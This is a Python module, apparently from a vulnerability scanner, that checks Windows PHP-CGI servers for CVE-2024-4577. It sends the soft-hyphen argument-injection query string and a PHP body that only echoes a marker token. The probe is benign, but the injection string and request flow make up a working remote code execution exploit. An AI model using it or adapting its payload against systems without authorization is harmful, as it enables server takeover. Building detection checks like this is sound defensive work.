"""
Raw execution for php_cgi_arg_injection_probe (CVE-2024-4577).
Tests Windows PHP-CGI installations (Apache/XAMPP/standalone) for argument
injection via the Best-Fit encoding soft-hyphen (%ad) bypass. Sends a benign
non-destructive PHP evaluation probe (echoing an MD5 token and terminating) via
php://input to confirm whether code execution occurs.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import hashlib
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
PROBE_SECRET = "tradecraft_cve_2024_4577_check"
EXPECTED_HASH = hashlib.md5(PROBE_SECRET.encode()).hexdigest()
PROBE_TOKEN = f"tradecraft_cve4577_{EXPECTED_HASH}"
BENIGN_PHP_PAYLOAD = f"<?php echo '{PROBE_TOKEN}'; die(); ?>"

CANDIDATE_PATHS = [
    "/index.php",
    "/",
    "/php-cgi/php-cgi.exe",
    "/cgi-bin/php-cgi.exe",
]


@dataclass
class PhpCgiProbeAttempt:
    url: str
    status_code: Optional[int] = None
    reflected_token: bool = False
    body_snippet: str = ""
    error: Optional[str] = None


@dataclass
class RawPhpCgiResult:
    target: str = ""
    base_url: str = ""
    probe_token: str = PROBE_TOKEN
    attempts: List[PhpCgiProbeAttempt] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = f"https://{t}"
    return t.rstrip("/")


def execute(
    target: str,
    path: Optional[str] = None,
    timeout: int = 8,
) -> RawPhpCgiResult:
    if requests is None:
        return RawPhpCgiResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawPhpCgiResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    result = RawPhpCgiResult(target=target.strip(), base_url=base_url)

    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
    })

    if path and path.strip():
        p = path.strip()
        if not p.startswith("/"):
            p = f"/{p}"
        paths_to_test = [p]
    else:
        # Check if the target URL itself pointed to a specific file (e.g. /info.php)
        parsed = urlparse(base_url)
        if parsed.path and parsed.path.endswith(".php"):
            paths_to_test = [parsed.path]
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            result.base_url = base_url
        else:
            paths_to_test = CANDIDATE_PATHS

    query_payload = "%add+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"

    for candidate_path in paths_to_test:
        probe_url = f"{base_url}{candidate_path}?{query_payload}"
        attempt = PhpCgiProbeAttempt(url=probe_url)
        try:
            resp = session.post(
                probe_url,
                data=BENIGN_PHP_PAYLOAD,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            attempt.status_code = resp.status_code
            text = resp.text or ""
            attempt.body_snippet = text[:500]

            if PROBE_TOKEN in text:
                attempt.reflected_token = True

        except requests.exceptions.RequestException as e:
            attempt.error = str(e)

        result.attempts.append(attempt)

        # Stop probing once vulnerability is confirmed on one endpoint
        if attempt.reflected_token:
            break

    return result
